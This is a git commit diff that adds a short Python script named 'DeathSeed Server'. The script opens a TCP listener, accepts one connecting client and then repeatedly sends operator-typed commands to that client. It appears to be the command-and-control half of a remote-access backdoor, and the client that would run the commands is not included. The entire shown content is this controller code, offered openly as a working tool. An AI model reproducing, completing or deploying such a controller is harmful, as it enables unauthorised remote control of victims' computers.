d40e820d3994783ec92c670a20dba9dc03463c58
sebz0ne <147282723+sebz0ne@users.noreply.github.com>
2024-02-12 19:34:48 +0100

    Update main.py

--- main.py
+++ main.py
@@ -1,1 +1,25 @@
 
+# DeathSeed Server
+
+import socket, os, time
+
+os.system("cls && title DeathSeed Server")
+
+ip = "127.0.0.1"
+port = 50000
+
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.bind((ip, port))
+s.listen()
+
+client, address = s.accept()
+
+ipcli = client.recv(1024).decode()
+
+print(ipcli, " has connected.")
+
+while True:
+    command = input("> ")
+    client.send(command.encode())
+
